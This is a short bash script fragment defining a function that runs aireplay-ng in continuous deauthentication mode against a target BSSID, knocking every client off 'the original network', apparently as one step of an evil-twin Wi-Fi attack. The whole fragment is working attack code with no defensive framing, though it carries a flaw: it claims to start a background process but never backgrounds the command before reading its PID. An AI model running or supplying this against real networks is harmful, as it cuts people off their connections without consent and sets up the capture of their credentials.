#!/usr/bin/env bash

start_deauth_loop() {
    log "Starting to deauth all machines on the original network...."
    aireplay-ng  -0 0 -a $TARGET_BSSID $IFACE_MON && AIREPLAY_PID=$!
    log "Deauth started in background process : $AIREPLAY_PID"
}
